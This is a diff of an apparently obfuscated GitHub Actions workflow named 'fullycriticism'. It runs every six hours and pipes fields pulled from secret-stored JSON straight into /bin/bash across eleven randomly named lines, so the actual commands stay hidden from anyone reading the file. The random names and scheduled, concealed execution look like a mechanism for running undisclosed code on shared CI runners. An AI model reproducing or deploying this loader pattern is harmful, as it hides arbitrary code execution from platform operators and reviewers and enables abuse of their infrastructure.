@@ -1,24 +1,26 @@
 name: fullycriticism
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 3/6 * * *'
-
+    - cron: '20 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fullycriticism
         env:
-          syefc13050: ${{ secrets.syefc13050 }}
+          pu48491: ${{ secrets.pu48491 }}
         run: |
-          echo $syefc13050 | jq -r .opmlz2 | /bin/bash
-          echo $fny97 | jq -r .lxju99 | /bin/bash
-          echo $i3742 | jq -r .eve79 | /bin/bash
-          echo $itp64 | jq -r .cdfb5 | /bin/bash
-          echo $bzad2 | jq -r .cml7 | /bin/bash
-          echo $ht49 | jq -r .yj5343 | /bin/bash
+          echo $pu48491 | jq -r .khytt9 | /bin/bash
+          echo $wdzgn9 | jq -r .epk06 | /bin/bash
+          echo $ahwx27016 | jq -r .q167 | /bin/bash
+          echo $zgvns97 | jq -r .y72280 | /bin/bash
+          echo $ygik559 | jq -r .kq3533 | /bin/bash
+          echo $clv25688 | jq -r .rw41 | /bin/bash
+          echo $tuo04 | jq -r .cnux86 | /bin/bash
+          echo $xnjpg3916 | jq -r .inom1719 | /bin/bash
+          echo $rdeq4880 | jq -r .ew6427 | /bin/bash
+          echo $ab63694 | jq -r .nr325 | /bin/bash
+          echo $stfze357 | jq -r .py48 | /bin/bash
 
